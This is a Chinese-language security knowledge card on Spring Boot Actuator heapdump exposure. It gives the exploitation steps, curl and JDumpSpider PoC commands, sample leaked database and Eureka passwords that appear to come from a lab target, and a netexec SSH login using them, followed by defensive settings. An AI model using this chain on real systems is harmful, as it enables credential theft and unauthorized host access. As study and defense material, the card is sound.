---
id: web-java-framework-spring-actuator-heapdump-credential-leak
title: Spring Boot Actuator heapdump 暴露导致数据库与系统凭据泄露
type: scenario
domain: web
path: web/java/framework/spring
technique: spring-actuator-heapdump-credential-leak
aliases:
- Spring Actuator heapdump 泄露
- heapdump 提取密码
- JDumpSpider 分析堆转储
- Spring Boot 内存快照凭据
- actuator 未授权访问
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
tags:
- java
- spring-boot
- actuator
- heapdump
- credential-leak
- information-disclosure
cve: []
verification:
  verified_by: verifier-V9
  verified_at: '2026-11-05T00:25:14+08:00'
  notes: 已对照原文与图08/13核对：feroxbuster 发现 /actuator/heapdump（80165337 字节），JDumpSpider 输出与卡中 PoC 完全一致（oscar190 / 0sc@r190_S0l!dP@sswd / jdbc:mysql://localhost:3306/Furni_WebApp_DB），netexec 验证后 SSH 登录成功。frontmatter 无 sources/source_url，路径合法。PoC 未在本机执行。
---

## 一句话结论

Spring Boot Actuator 的 `/actuator/heapdump` 被暴露时，攻击者可直接下载整个 JVM 堆内存；用 MAT 或 JDumpSpider 分析可提取数据源 URL、数据库用户名/明文密码、Eureka Basic 认证凭据等，凭据常被复用为 SSH/其他服务账号，从而从信息泄露升级为系统登录。

## 原理

- Spring Boot Actuator 提供 `/actuator/heapdump` 端点，会触发 JVM heap dump 并返回 HPROF 文件，内容是完整堆内存快照。
- 应用运行期间，数据库连接池（HikariCP/Druid）、Spring 配置属性、认证过滤器等对象会长期持有连接字符串、用户名、密码、Token、密钥等敏感字符串；它们以普通 `String` 对象存在于堆中。
- 若 `management.endpoints.web.exposure.include=*`（或显式包含 heapdump）且端点未鉴权/未限制来源，攻击者即可匿名下载。案例中还通过 nginx `alias` 把 `/actuator/heapdump` 映射到固定文件，进一步扩大了暴露面。
- 攻击者用 Eclipse MAT 手动搜索字符串，或 JDumpSpider 自动识别 `SpringDataSourceProperties`、`HikariDataSource`、`RedisStandaloneConfiguration` 等对象，提取 `url`、`username`、`password` 字段。
- 提取到的凭据若与系统账号复用（案例中 JDBC 账号 `oscar190` 同时是 SSH 用户），可直接 SSH 登录，完成从 Web 信息泄露到主机权限的跨越。

## 触发条件

1. 目标为 Spring Boot 应用，Actuator 端点可访问。
2. `management.endpoints.web.exposure.include` 包含 `heapdump`（常见为 `*`），且未配置安全认证/来源限制。
3. heapdump 文件可被下载（端点直接返回或 nginx/静态目录暴露）。
4. 应用堆中存在可用的凭据（数据库、缓存、消息队列、注册中心等），且凭据在其他服务复用。

## 利用步骤

1. 目录/端点扫描发现 `/actuator`，枚举 `env`、`mappings`、`heapdump` 等端点。
2. 下载 heapdump：`curl http://target/actuator/heapdump -o heapdump`。
3. 用 JDumpSpider 自动分析，或用 MAT 打开后搜索 `jdbc:`、`password`、`eureka`、`secret` 等关键字。
4. 提取数据库连接串、用户名、明文密码，以及注册中心/中间件凭据。
5. 用 netexec/hydra 等验证凭据在其他服务（SSH、数据库、后台）的可用性。
6. 登录后继续内网信息收集与横向。

## PoC

下载并分析：

```bash
curl -s http://target/actuator/heapdump -o heapdump
java -jar JDumpSpider.jar heapdump
```

JDumpSpider 输出示例：

```text
SpringDataSourceProperties
password = 0sc@r190_S0l!dP@sswd
driverClassName = com.mysql.cj.jdbc.Driver
url = jdbc:mysql://localhost:3306/Furni_WebApp_DB
username = oscar190
```

MAT/strings 中可见：

```text
jdbc:mysql://localhost:3306/Furni_WebApp_DB§{password=0sc@r190_S0l!dP@sswd, user=oscar190}
eureka.client.service-url.defaultZone=http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/
```

验证 SSH：

```bash
netexec ssh target -u oscar190 -p '0sc@r190_S0l!dP@sswd'
# [+] oscar190:... Linux - Shell access!
```

## 变体与关联

- 除 heapdump 外，`/actuator/env`、`/actuator/configprops`、`/actuator/mappings` 也可能直接泄露配置与路由。
- 堆转储还可提取 JWT 密钥、Session、Redis 密码、云厂商 AK/SK、内部服务 Token。
- 与“配置文件泄露”“源码泄露”同属凭据泄露，但 heapdump 能拿到运行时才存在的对象与解密后的值。
- 拿到凭据后可接 SSH 登录、数据库直连、注册中心劫持（见独立卡片）等后续链。

## 检测与防御

- 生产环境关闭 heapdump：`management.endpoint.heapdump.enabled=false`，并避免 `include=*`；只暴露必要端点。
- Actuator 端点加认证与网络 ACL（仅内网/管理网访问），不要在 nginx 中为 heapdump 配置公开 alias。
- 数据库/中间件使用独立最小权限账号，禁止与系统账号复用；定期轮换密码，使用密钥/凭据管理服务。
- 监控大文件下载（heapdump 通常数十 MB 到数 GB）与 `/actuator/*` 异常访问。
- 代码/配置审计检查 `management.endpoints.web.exposure.include` 与 Actuator 安全配置。
